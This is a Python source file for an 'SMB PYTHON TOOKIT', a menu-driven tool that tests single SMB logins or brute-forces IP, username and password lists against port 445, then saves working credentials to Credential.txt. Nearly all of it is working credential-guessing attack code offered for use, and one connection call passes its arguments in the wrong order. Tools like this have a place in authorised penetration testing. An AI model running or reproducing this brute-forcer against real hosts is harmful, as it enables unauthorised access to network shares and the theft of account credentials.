import os
from smb.SMBConnection import SMBConnection

############################ Clear Consle While Start a Loop ##############################
def clear():
    os.system('cls') #on Windows System

############################ Collect Single Credential From User Input ##############################
def CollectCredential():
    remote_ip = input('Enter Host IP:')
    username = input('Enter SMB Username:')
    password = input('Enter SMB Password:')
    domain = input('Enter Domain Name:')
    return(remote_ip,username,password,domain)

############################ Verify the Input File Direction ##############################
# If the direction cannot be found, set the input as an atribute.
def VerifyFile(up):
    ver = []
    try:
        file = open(up, 'r')
        data = file.readlines()
        print('File Directory Verified.')
        for line in data:
            ver.append(line.strip())
    except:
        ver.append(up)
        return ver
    return ver

############################ Collect File Directions From User Input ##############################
#Support IP, username, password SMB brute force attack, user can input single attributes replace one to three attributes with files
def CollectFiles():
    remote_ip = input('Enter Host IP or File Direction:')
    remote_ip = VerifyFile(remote_ip)
    username = input('Enter SMB Username or File Directory:')
    username = VerifyFile(username)
    password = input('Enter SMB Password or File Directory:')
    password = VerifyFile(password)
    domain = input('Enter Domain Name:')
    return(remote_ip,username,password,domain)

############################ Generate Collected Credentials in to Files ##############################                      
def GenerateCredentials():
    try:
        with open("Credential.txt",mode='w',encoding='utf-8') as ff:
            for i in range(len(credential)): 
                ff.write(credential[i]+' ')
                if (i+1) % 4 == 0:
                    ff.write('\n')
    except FileNotFoundError:
        with open("Credential.txt",mode='w',encoding='utf-8') as ff:
            for i in range(len(credential)): 
                ff.write(credential[i]+' ')
                if (i+1) % 4 == 0:
                    ff.write('\n')

############################ SMB Functions Using SMBConnection ##############################
class SMB(object):
    def __init__(self,remote_ip,username,password,domain):
        self.remote_ip = remote_ip
        self.username = username
        self.password = password
        self.domain = domain

############################ Use the Single Credential CollectCredential() to Login ##############################       
    def SingleLoginScanner(self):
        my_name = ""
        remote_name = ""
        try:
            self.conn = SMBConnection(self.username, self.password, my_name, remote_name, self.domain, use_ntlm_v2=True, sign_options=2, is_direct_tcp=True)
            connected = self.conn.connect(self.remote_ip,445)   
            if connected == True:
                print('Success :) %s USERNAME:%s PASSWORD:%s DOMAIN:%s' %(self.remote_ip, self.username, self.password, self.domain))
                credential.append(self.remote_ip)
                credential.append(self.username)
                credential.append(self.password)
                credential.append(self.domain)
                print("Credential",credential)
            else:
                print('False   :( %s USERNAME:%s PASSWORD:%s DOMAIN:%s' %(self.remote_ip, self.username, self.password, self.domain))
            self.conn.close()   
        except Exception as e:
            print(e)

############################ Use the Multiple Credentials CollectFiles() to Login ##############################     
    def MultiLoginScanner(self):
        count = 0
        my_name = ""
        remote_name = ""
        for ip in self.remote_ip:
            for username in self.username:
                for password in self.password:
                    count += 1
                    try:
                        self.conn = SMBConnection(username, password, self.domain, my_name, remote_name, use_ntlm_v2=True, sign_options=2, is_direct_tcp=True)
                        connected = self.conn.connect(ip,445)      
                        if connected == True:
                            print('%d Success :) %s USERNAME:%s PASSWORD:%s DOMAIN:%s' %(count, ip, username, password, self.domain))
                            credential.append(ip)
                            credential.append(username)
                            credential.append(password)
                            credential.append(self.domain)
                            print("Credential",credential)
                        else:
                            print('%d False   :( %s USERNAME:%s PASSWORD:%s DOMAIN:%s' %(count, ip, username, password, self.domain))   
                        self.conn.close()
                    except Exception as e:
                        print('%d False   :( %s USERNAME:%s PASSWORD:%s DOMAIN:%s' %(count, ip, username, password, self.domain))
                        print(e)

############################ SMB Functions Support User to Chose ##############################
def main():
    while(1):
        print('********************SMB PYTHON TOOKIT********************')
        print('1. Single credential SMB Login Scanner')
        print('2. Credentials list from file SMB Brute Force')
        print('3. Generate Collected Credentials')
        print('*********************************************************\n')
        chose = input('Type number to pick function:')
            
        if chose == '1':
            print('Only support to input single ip address, username and password.\n')
            remote_ip,username,password,domain = CollectCredential()
            smb = SMB(remote_ip,username,password,domain) 
            smb.SingleLoginScanner()

        elif chose == '2':
            print('Support Local File Directories contain ip/username/password or they will be recognized as a string.\n')
            remote_ip,username,password,domain = CollectFiles()
            smb = SMB(remote_ip,username,password,domain) 
            smb.MultiLoginScanner()

        elif chose == '3':
            print('Generating Successful Credentials in a txt file...\n')
            GenerateCredentials()
            print('Generated Credential.txt in the same python Directory.\n')
            
        else:
            print('Please input valid number!\n')
            clear()
        
if __name__ == '__main__':
    credential = []
    main()
